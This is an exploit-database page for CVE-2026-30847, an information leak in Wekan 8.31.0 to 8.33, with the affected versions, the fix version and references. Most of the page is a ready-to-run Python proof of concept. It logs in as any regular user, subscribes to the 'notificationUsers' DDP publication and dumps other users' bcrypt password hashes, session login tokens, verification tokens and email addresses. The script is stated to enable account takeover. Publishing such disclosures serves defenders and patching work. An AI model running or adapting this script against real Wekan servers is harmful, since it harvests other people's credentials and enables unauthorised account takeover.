---
title: Wekan 8.31.0 - 8.33Meteor DDP notificationUsers Sensitive Data Leak
url: https://cxsecurity.com/issue/WLB-2026030022
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-15
fetch_date: 2026-03-16T04:33:22.395098
---

# Wekan 8.31.0 - 8.33Meteor DDP notificationUsers Sensitive Data Leak

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Wekan 8.31.0 - 8.33Meteor DDP notificationUsers Sensitive Data Leak** **2026.03.15**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-30847](https://cxsecurity.com/cveshow/CVE-2026-30847/ "Click to see CVE-2026-30847")**  CWE: **[CWE-200](https://cxsecurity.com/cwe/CWE-200 "Click to see CWE-200")** | |

#!/usr/bin/env python3
# Exploit Title: Wekan 8.31.0 - 8.33Meteor DDP notificationUsers Sensitive Data Leak
# CVE: CVE-2026-30847
# Date: 2026-03-08
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://wekan.github.io
# Software Link: https://github.com/wekan/wekan
# Affected: Wekan 8.31.0 - 8.33
# Tested on: Wekan 8.32 (Docker)
# Category: Webapps
# Platform: Linux / Docker
# Exploit Type: Remote
# CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
# Description: Any authenticated user can subscribe to the Meteor publication "notificationUsers" and receive full user documents including bcrypt password hashes, active session login tokens, email addresses, and other sensitive service data due to missing field projection and authorization checks.
# Fixed in: Wekan v8.34 (commit 1c8667eae8b28739e43569b612ffdb2693c6b1ce)
# Usage:
# python3 exploit.py https://wekan.example.com username password
#
# Examples:
# python3 exploit.py https://wekan.company.com user@company.com P@ssw0rd123
#
# Options:
# --help Show this help message and exit
#
# Notes:
# • Requires valid credentials of any regular user (admin not required)
# • Leaked data includes password hashes and active session tokens → possible account takeover
#
# How to Use
#
# Step 1:
# Install required package:
# pip install meteor-ddp-client
#
# Step 2:
# Run the exploit with target URL and credentials:
# python3 exploit.py https://target-wekan.com username password
import sys
import json
import time
from meteor\_ddp\_client import MeteorClient
import argparse
def on\_connected():
print("[+] Connected to DDP server")
def on\_failure(err):
print(f"[-] Connection failed: {err}")
sys.exit(1)
def main():
parser = argparse.ArgumentParser(description="CVE-2026-30847 PoC - Wekan user data leak")
parser.add\_argument("url", help="Wekan base URL (e.g. https://wekan.example.com)")
parser.add\_argument("username", help="Valid username or email")
parser.add\_argument("password", help="Password")
args = parser.parse\_args()
base\_url = args.url.rstrip('/')
ddp\_url = base\_url.replace("http://", "ws://").replace("https://", "wss://") + "/websocket"
print(f"[\*] Targeting: {base\_url}")
print(f"[\*] DDP endpoint: {ddp\_url}")
client = MeteorClient(ddp\_url)
client.on('connected', on\_connected)
client.on('failed', on\_failure)
print("[\*] Connecting...")
client.connect()
time.sleep(1.5)
print("[\*] Logging in...")
try:
client.login\_with\_password(args.username, args.password)
print("[+] Login successful")
except Exception as e:
print(f"[-] Login failed: {e}")
client.close()
sys.exit(1)
time.sleep(1)
print("[\*] Subscribing to notificationUsers...")
sub\_id = client.subscribe("notificationUsers", [])
time.sleep(3)
print("\n[+] Collecting leaked user documents...\n")
leaked\_users = []
if "users" in client.collections:
users\_coll = client.collections["users"]
for uid, doc in users\_coll.items():
if uid == client.user\_id:
continue
leaked = {
"\_id": uid,
"username": doc.get("username"),
"emails": doc.get("emails", []),
"profile": doc.get("profile", {}),
}
services = doc.get("services", {})
if services:
leaked["services"] = {}
if "password" in services and "bcrypt" in services["password"]:
leaked["services"]["password\_hash"] = services["password"]["bcrypt"]
if "resume" in services and "loginTokens" in services["resume"]:
leaked["services"]["session\_tokens"] = [
{"hashedToken": t.get("hashedToken"), "when": t.get("when")}
for t in services["resume"]["loginTokens"]
]
if "email" in services and "verificationTokens" in services["email"]:
leaked["services"]["verification\_tokens"] = services["email"]["verificationTokens"]
for key in services:
if key not in ["password", "resume", "email"]:
leaked["services"][key] = services[key]
leaked\_users.append(leaked)
if not leaked\_users:
print("[-] No other users leaked")
else:
print(f"[+] Found {len(leaked\_users)} leaked user(s):\n")
for user in leaked\_users:
print(json.dumps(user, indent=2, default=str))
print("-" \* 60)
print("\n[\*] Cleaning up...")
client.unsubscribe(sub\_id)
client.logout()
client.close()
if leaked\_users:
print("[!] VULNERABLE: Sensitive data was exposed")
else:
print("[?] No sensitive data captured")
if \_\_name\_\_ == "\_\_main\_\_":
main()

**##### References:**

https://github.com/wekan/wekan/releases/tag/v8.34

https://github.com/wekan/wekan/commit/1c8667eae8b28739e43569b612ffdb2693c6b1ce

https://securitylab.github.com/advisories/GHSL-2026-035\_Wekan/

https://nvd.nist.gov/vuln/detail/CVE-2026-30847

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030022)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top